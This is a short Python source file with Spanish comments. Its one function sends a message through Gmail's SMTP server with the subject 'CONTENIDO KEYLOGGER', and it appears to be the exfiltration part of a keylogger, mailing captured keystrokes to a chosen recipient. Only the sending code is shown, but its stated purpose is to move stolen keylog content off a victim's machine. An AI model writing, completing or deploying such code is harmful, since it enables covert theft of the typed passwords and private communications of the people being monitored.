import os
import smtplib, ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def send_email(mensaje):
    # Configuración del servidor SMTP de Gmail
    smtp_server = "smtp.gmail.com"
    smtp_port = 465  # Puerto seguro SSL

    # Cargar credenciales desde variables de entorno
    sender_email = os.getenv("SENDER_EMAIL")  # Variable de entorno
    sender_password = os.getenv("SENDER_PASSWORD")  # Variable de entorno
    recipient_email = os.getenv("RECIPIENT_EMAIL")  # Variable de entorno
    subject = "CONTENIDO KEYLOGGER"

    # Crear el mensaje completo (con cabeceras)
    mensaje_mime = MIMEMultipart()
    mensaje_mime["From"] = sender_email
    mensaje_mime["To"] = recipient_email
    mensaje_mime["Subject"] = subject
    mensaje_mime.attach(MIMEText(mensaje, "plain", "utf-8"))

    # Crear una conexión segura con el servidor SMTP
    context = ssl.create_default_context()
    try:
        with smtplib.SMTP_SSL(smtp_server, smtp_port, context=context) as server:
            server.login(sender_email, sender_password)  # Iniciar sesión en la cuenta
            server.sendmail(sender_email, recipient_email, mensaje_mime.as_string())  # Enviar el correo
            print("Correo enviado correctamente.")
    except Exception as e:
        print(f"Error al enviar el correo: {e}")

